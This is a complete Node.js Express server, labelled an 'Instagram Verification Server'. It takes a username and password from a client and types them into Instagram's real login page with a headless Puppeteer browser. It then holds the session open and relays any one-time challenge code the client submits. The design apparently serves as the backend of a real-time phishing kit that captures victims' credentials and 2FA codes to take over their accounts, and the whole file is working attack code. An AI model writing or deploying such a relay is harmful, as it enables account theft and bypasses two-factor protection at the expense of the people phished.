const express = require('express');
const puppeteer = require('puppeteer');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// متصفح واحد يعمل طوال الوقت
let browser = null;
let isBrowserReady = false;
let sessions = new Map();

// تشغيل المتصفح مرة واحدة عند بدء السيرفر
async function initBrowser() {
    if (!browser) {
        console.log('🚀 Lancement du navigateur...');
        browser = await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
        });
        isBrowserReady = true;
        console.log('✅ Navigateur prêt');
    }
    return browser;
}

// إنشاء صفحة جديدة لكل جلسة
async function createNewPage() {
    await initBrowser();
    const page = await browser.newPage();
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    return page;
}

function generateSessionId() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// التحقق من الباسورد
async function checkPassword(username, password, sessionId) {
    let sessionPage = null;
    try {
        sessionPage = await createNewPage();
        await sessionPage.goto('https://www.instagram.com/accounts/login/', { waitUntil: 'networkidle2', timeout: 30000 });
        await sessionPage.waitForSelector('input[name="username"]', { timeout: 10000 });
        await sessionPage.type('input[name="username"]', username, { delay: 100 });
        await sessionPage.type('input[name="password"]', password, { delay: 100 });
        await sessionPage.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        const currentUrl = sessionPage.url();
        sessions.set(sessionId, { page: sessionPage, username, step: 'waiting' });
        
        if (currentUrl.includes('challenge')) {
            return { success: false, step: 'otp_required', message: 'Code requis', sessionId };
        } else if (currentUrl.includes('accounts/login')) {
            await sessionPage.close();
            return { success: false, message: 'Mot de passe incorrect' };
        } else {
            return { success: true, message: 'Connexion réussie', sessionId };
        }
    } catch (error) {
        if (sessionPage) await sessionPage.close();
        return { success: false, message: error.message };
    }
}

// التحقق من OTP
async function verifyOTP(otpCode, sessionId) {
    const session = sessions.get(sessionId);
    if (!session || !session.page) {
        return { success: false, message: 'Session expirée' };
    }
    try {
        await session.page.waitForSelector('input[name="verificationCode"]', { timeout: 10000 });
        await session.page.type('input[name="verificationCode"]', otpCode, { delay: 100 });
        const confirmButton = await session.page.$('button[type="submit"]');
        if (confirmButton) await confirmButton.click();
        await new Promise(resolve => setTimeout(resolve, 5000));
        return { success: true, message: 'Code vérifié' };
    } catch (error) {
        return { success: false, message: error.message };
    }
}

// نقاط API
app.post('/api/check-password', async (req, res) => {
    const { username, password } = req.body;
    const sessionId = generateSessionId();
    const result = await checkPassword(username, password, sessionId);
    res.json(result);
});

app.post('/api/verify-otp', async (req, res) => {
    const { code, sessionId } = req.body;
    const result = await verifyOTP(code, sessionId);
    res.json(result);
});

app.get('/health', (req, res) => {
    res.json({ status: 'OK', sessions: sessions.size });
});

app.get('/', (req, res) => {
    res.json({ status: 'online', message: 'Instagram Verification Server' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`🚀 Serveur démarré sur http://localhost:${PORT}`);
    await initBrowser();
});